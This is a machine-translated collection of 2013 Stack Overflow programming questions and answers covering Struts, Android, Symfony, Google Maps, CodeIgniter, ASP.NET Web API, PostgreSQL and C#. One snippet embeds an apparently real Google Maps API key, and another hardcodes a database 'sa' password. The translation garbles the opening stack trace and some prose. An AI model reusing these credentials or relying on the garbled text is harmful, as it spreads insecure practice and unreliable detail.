.webcontainerext.AbstractJSPExtensionServletWrapper.handleRequest(AbstractJSPExtensionServletWrapper.java:216) 在 com.ibm.ws.webcontainer.filter.WebAppFilterChain.invokeTarget(WebAppFilterChain.java:136) 在 com.ibm.ws.webcontainer.filter.WebAppFilterChain.doFilter(WebAppFilterChain .java:79) 在 com.ibm.ws.webcontainer.filter.WebAppFilterManager.doFilter(WebAppFilterManager.java:928）在 com.ibm.ws.webcontainer.filter.WebAppFilterManager.invokeFilters(WebAppFilterManager.java:1025) 在 com.ibm.ws.webcontainer.webapp.WebAppRequestDispatcher.dispatch(WebAppRequestDispatcher.java:1384) 在 com.ibm.ws .webcontainer.webapp.WebAppRequestDispatcher.forward(WebAppRequestDispatcher.java:193) 在 org.apache.struts.action.RequestProcessor.doForward(RequestProcessor.java:1085) 在 org.apache.struts.action.RequestProcessor.processForwardConfig(RequestProcessor.java :398) 在 org.apache.struts.action.RequestProcessor.process(RequestProcessor.java:241) 在 org.apache.struts.action.ActionServlet.process(ActionServlet.java:1196) 在 org.apache.struts.action。在 javax.servlet.http 的 javax.servlet.http.HttpServlet.service(HttpServlet.java:575) 的 ActionServlet.doGet(ActionServlet.java:414)。HttpServlet.service(HttpServlet.java:668) 在 com.ibm.ws.webcontainer.servlet.ServletWrapper.service(ServletWrapper.java:1224) 在 com.ibm.ws.webcontainer.servlet.ServletWrapper.handleRequest(ServletWrapper.java:第 774 章.webcontainer.filter.WebAppFilterChain.invokeTarget(WebAppFilterChain.java:136) 在 com.ibm.ws.webcontainer.filter.WebAppFilterChain.doFilter(WebAppFilterChain.java:79) 在 com.ibm.ws.webcontainer.filter.WebAppFilterManager.doFilter (WebAppFilterManager.java:928) 在 com.ibm.ws.webcontainer.filter.WebAppFilterManager.invokeFilters(WebAppFilterManager.java:1025) 在 com.ibm.ws.webcontainer.webapp。WebAppRequestDispatcher.dispatch(WebAppRequestDispatcher.java:1384) 在 com.ibm.ws.webcontainer.webapp.WebAppRequestDispatcher.forward(WebAppRequestDispatcher.java:193) 在 org.apache.struts.action.RequestProcessor.doForward(RequestProcessor.java:1085)在 org.apache.struts.action.RequestProcessor.processForwardConfig(RequestProcessor.java:398) 在 org.apache.struts.action.RequestProcessor.process(RequestProcessor.java:241) 在 org.apache.struts.action.ActionServlet.process (ActionServlet.java:1196) 在 org.apache.struts.action.ActionServlet.doGet(ActionServlet.java:414) 在 javax.servlet.http.HttpServlet.service(HttpServlet.java:575) 在 javax.servlet.http。 com.ibm.ws.webcontainer.servlet.ServletWrapper.service(ServletWrapper.java:1224) 上 com.ibm.ws 上的 HttpServlet.service(HttpServlet.java:668)。webcontainer.servlet.ServletWrapper.handleRequest(ServletWrapper.java:774) 在 com.ibm.ws.webcontainer.servlet.ServletWrapper.handleRequest(ServletWrapper.java:456) 在 com.ibm.ws.webcontainer.servlet.ServletWrapperImpl.handleRequest( ServletWrapperImpl.java:178) 在 com.ibm.ws.webcontainer.filter.WebAppFilterChain.invokeTarget(WebAppFilterChain.java:136) 在 com.ibm.ws.webcontainer.filter.WebAppFilterChain.doFilter(WebAppFilterChain.java:97) 在 com .web.sa.SecurityServlet.doFilter(SecurityServlet.java:75) 在 com.ibm.ws.webcontainer.filter.FilterInstanceWrapper.doFilter(FilterInstanceWrapper.java:195) 在 com.ibm.ws.webcontainer.filter.WebAppFilterChain.doFilter (WebAppFilterChain.java:91) 在 com.web.sa.SAReqLoggerServlet.doFilter(SAReqLoggerServlet.java:62) 在 com.ibm.ws.webcontainer.filter。FilterInstanceWrapper.doFilter(FilterInstanceWrapper.java:195) 在 com.ibm.ws.webcontainer.filter.WebAppFilterChain.doFilter(WebAppFilterChain.java:91) 在 com.ibm.ws.webcontainer.filter.WebAppFilterManager.doFilter(WebAppFilterManager.java: 928) 在 com.ibm.ws.webcontainer.filter.WebAppFilterManager.invokeFilters(WebAppFilterManager.java:1025) 在 com.ibm.ws.webcontainer.servlet.CacheServletWrapper.handleRequest(CacheServletWrapper.java:87) 在 com.ibm.ws .webcontainer.WebContainer.handleRequest(WebContainer.java:895) 在 com.ibm.ws.webcontainer.WSWebContainer.handleRequest(WSWebContainer.java:1662) 在 com.ibm.ws.webcontainer.channel.WCChannelLink.ready(WCChannelLink.java :195) 在 com.ibm.ws.http 的 com.ibm.ws.http.channel.inbound.impl.HttpInboundLink.handleDiscrimination(HttpInboundLink.java:459)。channel.inbound.impl.HttpInboundLink.handleNewRequest(HttpInboundLink.java:526) 在 com.ibm.ws.http.channel.inbound.impl.HttpInboundLink.processRequest(HttpInboundLink.java:312) 在 com.ibm.ws.http。 channel.inbound.impl.HttpInboundLink.ready(HttpInboundLink.java:283) 在 com.ibm.ws.ssl.channel.impl.SSLConnectionLink.determineNextChannel(SSLConnectionLink.java:1048) 在 com.ibm.ws.ssl.channel。 impl.SSLConnectionLink.readyInboundPostHandshake(SSLConnectionLink.java:716) 在 com.ibm.ws.ssl.channel.impl.SSLConnectionLink$MyHandshakeCompletedCallback.complete(SSLConnectionLink.java:412) 在 com.ibm.ws.ssl.channel.impl。 SSLUtils.handleHandshake(SSLUtils.java:1066) 在 com.ibm.ws.ssl.channel.impl.SSLHandshakeIOCallback.complete(SSLHandshakeIOCallback.java:87) 在 com.ibm.ws.tcp.channel.impl.AioReadCompletionListener。futureCompleted(AioReadCompletionListener.java:165) 在 com.ibm.io.async.AbstractAsyncFuture.invokeCallback(AbstractAsyncFuture.java:217) 在 com.ibm.io.async.AsyncChannelFuture.fireCompletionActions(AsyncChannelFuture.java:161) 在 com.ibm .io.async.AsyncFuture.completed(AsyncFuture.java:138) 在 com.ibm.io.async.ResultHandler.complete(ResultHandler.java:204) 在 com.ibm.io.async.ResultHandler.runEventProcessingLoop(ResultHandler.java :775) 在 com.ibm.io.async.ResultHandler$2.run(ResultHandler.java:905) 在 com.ibm.ws.util.ThreadPool$Worker.run(ThreadPool.java:1814)async.AsyncFuture.completed(AsyncFuture.java:138) 在 com.ibm.io.async.ResultHandler.complete(ResultHandler.java:204) 在 com.ibm.io.async.ResultHandler.runEventProcessingLoop(ResultHandler.java:775)在 com.ibm.io.async.ResultHandler$2.run(ResultHandler.java:905) 在 com.ibm.ws.util.ThreadPool$Worker.run(ThreadPool.java:1814)async.AsyncFuture.completed(AsyncFuture.java:138) 在 com.ibm.io.async.ResultHandler.complete(ResultHandler.java:204) 在 com.ibm.io.async.ResultHandler.runEventProcessingLoop(ResultHandler.java:775)在 com.ibm.io.async.ResultHandler$2.run(ResultHandler.java:905) 在 com.ibm.ws.util.ThreadPool$Worker.run(ThreadPool.java:1814)

但表格在源代码中：web\src\com\web\sa\SAChangeSecretQAsFormBean.java

我的网络配置：web.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app id="WebApp" version="3.0" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd">
...
    <servlet>
    <servlet-name>action</servlet-name>
    <servlet-class>org.apache.struts.action.ActionServlet</servlet-class>
    <init-param>
        <param-name>config</param-name>
        <param-value>/WEB-INF/struts-config.xml</param-value>
    </init-param>
    <init-param>
        <param-name>config/jsp/sa</param-name>
        <param-value>/WEB-INF/struts-config-sa.xml</param-value>
    </init-param>
...
        <load-on-startup>2</load-on-startup>
</servlet>
...
</web-app> 
```

我的 sturts 配置是：struts-config.xml

```
 <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE struts-config PUBLIC "-//Apache Software Foundation//DTD Struts Configuration 1.2//EN"
                               "struts-config_1_2.dtd">
<struts-config>
    <!-- Data Sources -->
    <data-sources></data-sources>

    <!-- Form Beans -->
    <form-beans>
...
        <form-bean name="SAChangeSecretQAsFormBean" type="com.web.sa.SAChangeSecretQAsFormBean"></form-bean>
...
</form-beans>
...
</struts-config> 
```

struts-config-sa.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE struts-config PUBLIC "-//Apache Software Foundation//DTD Struts Configuration 1.2//EN"
                               "struts-config_1_2.dtd">

<struts-config>
...
    <form-beans>
...
    <form-bean name="SAChangeSecretQAsFormBean" type="com.web.sa.SAChangeSecretQAsFormBean"></form-bean>
...
    </form-beans>
...
    <action-mappings>
...
    <action path="/SAChangeSecretQAs" 
            name="SAChangeSecretQAsFormBean" 
            type="com.web.sa.SAChangeSecretQAsAction" scope="session" input="success">
        <forward name="success" path="jsp/sa/SA_SecretQuestions.jsp"></forward>
        <forward name="logout" path="jsp/sa/SALogout.do?buttonPressed=logout&amp;CASE_FORWARD=YES"></forward>
        <forward name="access" path="jsp/sa/SAAccessDetails.do?CASE_FORWARD=YES"></forward>
    </action>
...
    </action-mappings>
</struts-config> 
```

SAChangeSecretQAsFormBean.java

```
package com.web.common;

public class SAChangeSecretQAsFormBean extends ValidatorForm
{
...
} 
```

SAChangeSecretQAsAction.java

```
package com.web.sa;
public class SAChangeSecretQAsAction extends Action
{
    public ActionForward executeAction(
                    ActionMapping mapping,
                    ActionForm form,
                    HttpServletRequest req,
                    HttpServletResponse res)
                    throws IOException, ServletException
    {
...
    }
...
} 
```

SA_SecretQuestions.jsp

```
<%@ include file = "../common/header.inc"%>
<%
  try {
      %>
<html-el:javascript formName="SAChangeSecretQAsFormBean" staticJavascript="false" dynamicJavascript="true" page="0" />
      <%
  }
  catch (Exception x) {
    x.printStackTrace();
  }
%> 
```

头文件公司

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<%@ taglib uri="../../WEB-INF/struts-html-el.tld" prefix="html-el" %>
<%@ taglib uri="http://java.sun.com/jstl/core_rt" prefix="c" %>
<%@ taglib uri="http://java.sun.com/jstl/fmt" prefix="fmt" %>
<%@ taglib uri="../../WEB-INF/struts-bean.tld" prefix="bean" %>
<%@ taglib uri="../../WEB-INF/struts-logic-el.tld" prefix="logic-el" %>
<%@ page import ="com.constant.*" buffer="16kb" errorPage="../errorpages/GenericErrorPage.jsp"  %>

<%String cacheReq=null;%>

<html-el:base/>
<html> 
<HEAD> 
```

如果缺少任何其他信息，请告诉..谢谢

# android - 管理不同 ImageSize 的滚动视图

> ID：15244686
> 
> 赞同：1
> 
> 时间：2013-03-06T10:24:02.853
> 
> 标签：android, android-layout

我`ScrollView`在包含的布局中定义了`ImageSwitcher`

现在，当用户按下下一个按钮或上一个按钮时，我正在 `ImageSwitcher`动态更改里面的图像。

现在的问题是我有不同尺寸的图像，一个高度短，另一个高度长。所以当第一个短图像显示然后长并且如果我返回然后滚动视图占据长图像的高度而不是短图像的尺寸。

这是我的布局

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:background="#FFFFFF" >

    <ScrollView 

        android:layout_height="wrap_content"
        android:layout_width="wrap_content"
        android:layout_centerInParent="true"
        android:layout_below="@+id/headerBar"
        android:visibility="gone"
        android:id="@+id/helpPanel"

       >
         <ImageSwitcher android:id="@+id/switcher"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"

        />

       </ScrollView>
   </RelativeLayout> 
```

# symfony - 如何将个人供应商添加到 Symfony 2 项目中？

> ID：15244687
> 
> 赞同：0
> 
> 时间：2013-03-06T10:24:03.777
> 
> 标签：symfony

我是 Symfony 2 的新手。我想在我的项目中添加库之类的类，但我不知道如何。

假设我有 2 个 A 类和 B 类。

我将它们定位在这个位置： vendor/my_vendor_name/xxxx/A.php 和 vendor/my_vendor_name/xxxx/B.php

在每个类中，我定义了相同的命名空间：

```
namespace my_vendor_name/xxxx 
```

现在我想通过调用在我的包中使用这两个类：

```
use my_vendor_name/xxxx/A or my_vendor_name/xxxx/B 
```

但这就像我的命名空间不存在（找不到类）......也许我必须在某处声明这些命名空间，才能注册它们。

我的应用程序/autoload.php

```
<?php

use Doctrine\Common\Annotations\AnnotationRegistry;

$loader = require __DIR__.'/../vendor/autoload.php';

// intl
if (!function_exists('intl_get_error_code')) {
require_once     __DIR__.'/../vendor/symfony/symfony/src/Symfony/Component/Locale/Resources/stubs/functions.php';

$loader->add('', __DIR__.'/../vendor/symfony/symfony/src/Symfony/Component/Locale/Resources/stubs'); 
```

}

```
AnnotationRegistry::registerLoader(array($loader, 'loadClass'));

return $loader; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:37:28.957

更深入地查看文档。[类加载器组件](http://symfony.com/doc/2.1/components/class_loader.html)部分对此进行了很好的解释。

**从文档中，**

如果要自动加载的类使用命名空间，请使用[registerNamespace()](http://api.symfony.com/2.1/Symfony/Component/ClassLoader/UniversalClassLoader.html#registerNamespace%28%29)或[registerNamespaces()](http://api.symfony.com/2.1/Symfony/Component/ClassLoader/UniversalClassLoader.html#method_registerNamespaces)方法。对于遵循 PEAR 命名约定的类，请使用[registerPrefix()](http://api.symfony.com/2.1/Symfony/Component/ClassLoader/UniversalClassLoader.html#registerPrefix%28%29)或[registerPrefixes()](http://api.symfony.com/2.1/Symfony/Component/ClassLoader/UniversalClassLoader.html#method_registerPrefix)方法。

**注意，**文档中[充满了](http://symfony.com/doc/2.1/components/class_loader.html)满足您需求的示例（向您的项目添加外部类或 PHP 库）

**另外，**请查看[Composer](http://getcomposer.org/doc/)文档的[自动加载](http://getcomposer.org/doc/01-basic-usage.md#autoloading)部分。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-06T10:37:39.403

这不是正确的前进方式。

你有，按这个顺序：

*   `src/`在目录下创建一个包
*   将您的捆绑包注册到`app/AppKernel.php`文件中
*   在你的包下创建你的类
*   随时随地使用这些课程

真实例子：

## 捆绑创建

在 dir下创建一个目录`src/`。这个目录将包含你所有的包。按照惯例，这个目录应该是你的“公司”名称（对于我们的例子，说它是*Foo*）。

之后，为您的捆绑包创建一个目录，并使用您的捆绑包的名称。对于我们的例子。我们决定称它为*FooBundle*。

因此，您将拥有此目录树：`src/Foo/FooBundle/`

您`FooBundle/`必须创建一个用于捆绑注册的文件。此处报告此文件：

```
<?php

namespace Foo\FooBundle;

use Symfony\Component\HttpKernel\Bundle\Bundle;

class FooBundle extends Bundle
{
} 
```

文件名是`FooFooBundle.php`

## 注册您的捆绑包

进入`app/AppKernel.php`文件并添加这一行

```
public function registerBundles()
{
    [...]
    $bundles = array(
                   [...]
                   new Foo\FooBundle\FooFooBundle());
    [...] 
```

恭喜！您的捆绑包现已注册！

## 创建您的课程

只需将您的类创建到您的包中。我建议您将它们打包到一个目录中，`Core`或者您想要的任何目录

## 使用你的课程

假设您在全新的捆绑包中定义了一个名为 A 的类。

使用它非常简单：

```
use Foo\FooBundle\Core\A 
```

进入你想使用它的文件

现在一切都应该工作

* * *

## 小提示：

插入 src 的包与插入供应商一的包不同，只是因为您的包（src 一）仅由您使用，仅用于您的项目。供应商捆绑包是您在项目中使用的其他捆绑包。行为（如何创建捆绑包，如何注册和使用它）完全相同。

## 小注2：

如果您必须使用外部库或“旧” php 普通类，Ahmed 的回答为您提供了一个很好的起点

# asp.net-mvc - 在地图上显示城市和州名的指针

> ID：15244689
> 
> 赞同：1
> 
> 时间：2013-03-06T10:24:10.323
> 
> 标签：asp.net-mvc, html, google-maps, jquery

在我看来，我正在使用一些代码，

```
<body onload="initialize()">
    <div id="map_canvas" class="span8" style="height:400px"></div>
</body>

<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBl7fhDpSzGAqljlW7OCJZBsq6oDlGeckw&sensor=false"></script>
<script src="<?php echo $BASE?>scripts/analytics/standard_prospects_physicallocations.js" type="text/javascript"></script> 
```

我从服务器端控制器获取城市和州名，但我想显示指向这些城市的指针。怎么做到呢？如果您对此有任何参考，请建议我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:42:53.260

我不认为我们可以用他们的名字来标记州/城市，除非我们有相关的纬度/经度。

如果您有城市或州边界的纬度/经度集，则可以将其标记为多边形。

我发现，[**谷歌地理图表**](https://developers.google.com/chart/interactive/docs/gallery/geochart#Example)可以帮助你标记区域。

同样，您可以将其作为快速参考进行[***检查。***](https://stackoverflow.com/questions/6388590/highlighting-borders-of-state-and-cities-of-us-in-google-map-api-3)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T11:20:12.643

[地理编码](https://developers.google.com/maps/documentation/javascript/geocoding)将是从城市/州组合中找出纬度/经度的方法。

另一方面。从与城市名称/州相同的来源检索纬度/经度会更容易（往返时间更便宜，请求更少（有限））。

一旦有了纬度/经度，它就变成了将标记作为标准绘制的情况。

# php - 将选择框值存储到数组中

> ID：15244691
> 
> 赞同：0
> 
> 时间：2013-03-06T10:24:15.217
> 
> 标签：php, jquery, ajax

我有两个选择框和一个链接。我从第一个选择框中选择一个值，从第二个选择框中选择另一个值，然后单击链接。每次都必须将值存储在一个数组中，而不需要替换以前的值。如何我可以在不使用多个选择框的情况下做到这一点吗？

```
<select name="sq" id="sq" >
<option value=""></option>
</select>

<select name="as" id="as" >
<option value=""></option>
</select> 
```

抱歉忘了提..它在codeigniter中

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:26:24.867

您可以使用更改事件来存储选定的值。

*html*

```
<select name="sq" id="sq" >
   <option value="1">1</option>
   <option value="2">2</option>
</select> 
```

*Javascript*

```
arrSelected = []
$("#sq").change(function(){
     arrSelected.push($(this).val());
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T10:27:04.497

从评论中添加信息，这是我的建议：

HTML：

```
<div class="selectLine">
<select name="sq[]" >
<option value=""></option>
</select>

<select name="as[]" >
<option value=""></option>
</select></div>
<a id="addOption"> 
```

JavaScript：

```
$('#addOption').click(function(){
    $('.selectLine').last().after($('.selectLine').outerHtml());
    $('.selectLine').last().prev().hide();
}); 
```

PHP接收帖子：

```
foreach($_POST['sq'] as $key=>$name){
    //Make sure you stay consistent with the keys to make sure the 2 values were entered at the same time.
    echo '<p>'.$name.' is a '.$_POST['as'][$key].'</p>';
} 
```

将 [] 添加到输入名称的末尾会将它们放入数组中。但是，如果您想要多个值，则需要多个值...

您可以删除`$('.selectLine').last().prev().hide();`以保持向用户显示的行，以便他可以根据需要更改值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T10:26:38.560

如果您希望在您的网站中保持持久性，那么我建议您查看[PHP Cookies](http://php.net/manual/en/function.setcookie.php)。

在您的情况下，您希望持久地存储一个数组，因此您有几个选择。

要么实现[HTML 隐藏元素](http://www.tizag.com/htmlT/htmlhidden.php)，要么可以使用[序列化](http://php.net/manual/en/function.serialize.php)将数组存储在 cookie 中。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-06T10:41:49.937

这将使用 AJAX 发送数据而无需刷新页面：

用于链接`<a href="#" id="submitlink">Submit data</a>`

然后添加以下 jQuery 脚本：（您需要先包含 jQuery 库）

```
$('#submitlink').click(function(event) {
    event.preventDefault(); // Stops default link behaviour on click         
    $.ajax({ 
      url: "yourphp.php", // where to send
      data: 'sq=' + $('#sq').val() + '&as=' + $('#as').val(), // select values
      type: "POST",
      success: function(data){
           // If you want to confirm
           alert('Added');
      }
   });
}); 
```

然后在您的 php 脚本中将 $_POST 数据存储在数据库或会话中...

会话示例，存储：

```
<?php
   session_start();
   if (!isset($_SESSION['sq']) $_SESSION['sq'] = array();
   $_SESSION['sq'][] = $_POST['sq'];

   if (!isset($_SESSION['as']) $_SESSION['as'] = array();
   $_SESSION['as'][] = $_POST['as'];

  ?> 
```

要检索结果，您可以使用：

```
<?php
   session_start();
   if (isset($_SESSION['sq']) print_r($_SESSION['sq']);
   if (isset($_SESSION['as']) print_r($_SESSION['as']);
?> 
```

当然，这可以详细说明。

# ruby - 在 ruby 中从视频流中取出图像

> ID：15244693
> 
> 赞同：0
> 
> 时间：2013-03-06T10:24:25.707
> 
> 标签：ruby, video

我有一个指向一些视频流的链接（总是在某个地方录制的网络摄像头）。我希望能够在用户访问我的应用程序时截取该视频流上的内容。

可以做到吗？怎么做？

我看过但我能找到的只是从电影/视频中截取屏幕截图，而不是从流媒体视频中截取。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T12:59:57.520

我怀疑作为输入连接到流媒体服务的 ffmpeg 可能会为您提取缩略图。您可以让它运行并获取最新的缩略图，或者使用系统命令启动它并使其连接并发出单个屏幕截图。如果您的点击次数较少，后者会更高效且更容易编码，但每个请求的延迟都会很高。

我为你做了一个快速搜索，但 ffmpeg 与流输入最常见的用途是重新格式化和重新流式传输，或者在个人录像机设置中使用它。ffmpeg 相当复杂，所以我无法在到目前为止的时间内完成搜索。

# c# - c# 和 Asp.net web api 中的 URL 编码

> ID：15244697
> 
> 赞同：4
> 
> 时间：2013-03-06T10:24:44.760
> 
> 标签：c#, url, .net-4.0, asp.net-web-api, console-application

我有一个`ASP.NET web api`接收网络请求并返回`Json`数据的。
浏览到此 URL:
`http://1.2.3.4/api1/api/values/mypartname`将返回以下 json 字符串：

```
{
    \"PartName\": \"mypartname\",
    \"PartDes\": \"53.6X53.6APA/ALIM1NOTPAK\",
    \"PartLocation\": \"A36\"
} 
```

但是当发送一个包含空格或引号的部件名称时：`http://1.2.3.4/api1/api/values/my part na"me`我收到一个`404 - File or directory not found.`错误。
我正在`json`像`.NET 4 Console application`这样消费：

```
static void Main(string[] args)
    {
        try
        {
            string partName = "TAPE 56 3M 3/4\"";
            WebRequest wr = WebRequest.Create("http://1.2.3.4/api1/api/values/" +
                HttpUtility.UrlEncode(partName));
            wr.Credentials = CredentialCache.DefaultCredentials;
            HttpWebResponse hwr = (HttpWebResponse)wr.GetResponse();
            Stream dataStream = hwr.GetResponseStream();
            StreamReader reader = new StreamReader(dataStream);
            string json = reader.ReadToEnd();
            //some json parsing function
            des(json);
            reader.Close();
            dataStream.Close();
            hwr.Close();

        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
        }
        finally
        {
            Console.ReadKey();
        }
    } 
```

在这一行抛出异常：`HttpWebResponse hwr = (HttpWebResponse)wr.GetResponse();` 异常消息是：`The remote server returned an error: (404) Not Found.`

我做错了`mypartname`什么吗？我还尝试根据以下内容手动替换有问题的字符：[HTML URL Encoding Reference](http://www.w3schools.com/tags/ref_urlencode.asp) and using this function：`Uri.EscapeDataString(partName)`但没有运气。

**编辑**
这是 routeConfig 定义：

```
 routes.IgnoreRoute("{resource}.axd/{*pathInfo}");

        routes.MapRoute(
            name: "Default",
            url: "{controller}/{action}/{id}",
            defaults: new { controller = "Home", action = "Index", id = UrlParameter.Optional }
        ); 
```

和 api GET 方法：

```
// GET api/values/5
    public string Get(string id)
    {

        List<dummy> dummies = new List<dummy>();
        string con = "user id=sa;" +
                     "password=1234" +
                     "server=someServer\\someInstance;" +
                     "database=game; " +
                     "connection timeout=30";

        //SqlConnection sqlConn = new SqlConnection(con);
        using (SqlConnection sqlconn = new SqlConnection(con))
        {
            sqlconn.Open();
            StringBuilder sb = new StringBuilder();
            sb.Append("SELECT PART.PARTNAME,PART.PARTDES, PARTPARAMA.LOCATION ");
            sb.Append("FROM PART LEFT JOIN PARTPARAMA ");
            sb.Append("ON PART.PART = PARTPARAMA.PARTPARAM ");
            sb.Append("WHERE PART.PARTNAME = @part");

            using (SqlCommand cmd = new SqlCommand(sb.ToString(), sqlconn))
            {
                cmd.Parameters.AddWithValue("part", id);
                SqlDataReader sdr = cmd.ExecuteReader();
                while (sdr.Read())
                {

                    dummies.Add(new dummy
                    {
                        PartName = sdr.IsDBNull(0) ? "Unknown" : sdr.GetString(0),
                        PartDes = sdr.IsDBNull(1) ? "Unknown" : sdr.GetString(1),
                        PartLocation = sdr.IsDBNull(2) ? "Unknown" : sdr.GetString(2)
                    });
                }
            }
        }

        if (dummies.Count() > 0)
        {
            string json = JsonConvert.SerializeObject(dummies[0]);
            return json;
        }
        else
        {
            string json = JsonConvert.SerializeObject(null);
            return json;
        } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T12:38:03.867

**编辑**2015 年 4 月 10 日：

我将这个答案留给在搜索中找到它的任何人，但是正如凯文在下面所述和[斯科特汉塞尔曼在这里所说](http://www.hanselman.com/blog/ChecklistWhatNOTToDoInASPNET.aspx)：

> [UrlPathEncode] 并没有按照你的想法去做......这个方法非常具体，名字很糟糕，现在已经完全过时了。

* * *

我认为您的问题与零件名称中的正斜杠有关。您可以使用处理空格和引号

> `HttpUtility.UrlPathEncode(partName)`

而不是 `HttpUtility.UrlEncode(partName)`.

处理正斜杠更成问题。有关更多详细信息，请参阅[此帖子](https://stackoverflow.com/questions/591694/url-encoded-slash-in-url)。

# sql - 在 postgresql 中使用子查询进行更新

> ID：15244702
> 
> 赞同：1
> 
> 时间：2013-03-06T10:25:01.383
> 
> 标签：sql, postgresql

我尝试使用子查询更新 postgresql 表

```
 UPDATE
            bc
        SET
            (r, w) = ($1, $2)
        WHERE
            bc.sr_id IN (
                UPDATE
                    sr
                SET
                    (r, w) = ($1, $2)
                WHERE
                    si = $3 AND
                    rti = $4 AND
                    fc = $5
                RETURNING sr.id
            ) 
```

为什么它返回错误？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:36:31.567

您不能像这样链接 DML 语句。您将不得不使用可写的 CTE。

```
WITH buz AS
(UPDATE foo
SET num=0 WHERE num>5 RETURNING num)
UPDATE bar SET num=0 WHERE num IN
(SELECT num FROM foo);
SELECT * FROM foo;
SELECT * FROM bar; 
```

[http://sqlfiddle.com/#!1/513a2/1](http://sqlfiddle.com/#!1/513a2/1)

# c# - 从 MS Access 数据库中检索图像并在表单下显示

> ID：15244709
> 
> 赞同：0
> 
> 时间：2013-03-06T10:25:18.007
> 
> 标签：c#, asp.net

我在数据库中将图像保存为 OLE 对象数据类型。数据库中的图像如何显示在标签中？它也在'src'属性中吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:44:28.253

在其他答案中，您被指出文章解释了如何在数据网格中显示图像。一般来说，我在这里看到两个问题，如何从数据库中提取图像以及如何在标签中显示它。Andras Toth 的文章回答了这两个问题。但是如果你不打算使用网格，你应该在标签中提供图片的 url。[在这里](http://www.mikesdotnetting.com/Article/123/Storing-Files-and-Images-in-Access-with-ASP.NET)您可以阅读如何实现通用处理程序显示存储在数据库中的图像，因此您可以将 url 添加到图像的任何标记中。解决方案取决于您的需求。

# c# - 使用c#将一行多维数组复制到另一个有约束的数组

> ID：15244717
> 
> 赞同：1
> 
> 时间：2013-03-06T10:25:53.717
> 
> 标签：c#, multidimensional-array, copy, constraints

```
int[,] arr1 = new int[2,6];
arr1[0, 0] = 100;
arr1[1, 0] = 200;
int[,] arr2= {{1,2,3,4,5},{6,7,8,9,10}}; 
```

我想在**不使用循环**的情况下将每一行从 arr2 复制到 arr1 。 **约束就像应对数据开始 arr2 是索引 0 而 arr1 是索引 1。**

在实现逻辑 arr1 之前就像

```
Row1: 100,0,0,0,0,0
Row2: 200,0,0,0,0,0 
```

我想要输出**而不使用循环**来处理从 arr2 到 arr1 就像

```
Row1: 100,1,2,3,4,5
Row2: 200,6,7,8,9,10 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:35:15.730

如果没有任何循环，您将不得不对其进行硬编码。您可以调用的任何函数或库都将在后台使用某种循环。

至于硬编码，您正在寻找简单的东西：

```
arr1[0,1] = arr2[0,0];
arr1[0,2] = arr2[0,1]; 
```

ETC...

和

```
arr1[1,1] = arr2[1,0];
arr1[1,2] = arr2[1,1]; 
```

ETC...

# php - 分页不显示在网页上

> ID：15244718
> 
> 赞同：0
> 
> 时间：2013-03-06T10:25:54.213
> 
> 标签：php, codeigniter, pagination

大家好，由于某种原因，我在显示我的分页时遇到了一些问题，分页没有出现在页面上，有人可以帮助我，这是我的代码：

**看法**

```
<div>    

     <table border="1">

      <tr>
         <th>Name</th>
         <th>Second Name</th>
         <th>Phone</th>
         <th>Email</th>
         <th>Answer</th>
         <th>Comment</th>
     </tr>
      <?php foreach ($query as $row): ?> 
     <tr>

         <td><?php echo $row->name; ?></td>
         <td><?php echo $row->second_name; ?></td>
         <td><?php echo $row->phone; ?></td>
         <td><?php echo $row->email; ?></td>
          <td> <?php echo $row->answerA;?>
          <?php echo $row->answerB;?>
          <?php echo $row->answerC;?></td>
         <td><?php echo $row->comment;?><br></td>

     </tr>

      <?php endforeach; ?>

     </table>  
     <?php echo $this->pagination->create_links(); ?>

   </div> 
```

**控制器**

```
 <?php

class Result_controller extends CI_Controller{

    function getall(){

   $this->load->model('result_model');
        $data['query'] = $this->result_model->result_getall();
        // print_r($data['query']); die();

        $this->load->library('pagination');

        $config['base_url'] = 'http://localhost/Surva/index.php/result_controller/getall';
        $config['total_rows'] = $this->db->get('tblanswers')->num_rows();
        $config['per_page'] = 1;
        $config['num_links'] = 10;

        $this->pagination->initialize($config);

        $data['records'] = $this->db->get('tblanswers', $config['per_page'], $this->uri->segment(1, 0))->result_array();
        $data['pagination'] = $this->pagination->create_links();
        $this->load->view('result_view', $data);

        } 
```

我使用了codeigniter指南以及我在nettuts上找到的教程，任何帮助将不胜感激tnx提前。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T12:21:29.397

这样做

```
 $this->load->library('pagination');
    $limit = 10;

    $total = $this->legend_model->get_legend_count($language_id);

    $config['base_url'] = base_url().'legend/index/';
    $config['total_rows'] = $total;
    $config['per_page'] = $limit;
    $config['uri_segment'] = 3;

    $config['first_link'] = '<< First';
    $config['last_link'] = 'Last >>';
    $config['next_link'] = 'Next ' . '&gt;';
    $config['prev_link'] = '&lt;' . ' Previous';
    $config['num_tag_open'] = '<span class="number">';
    $config['num_tag_close'] = '</span>';

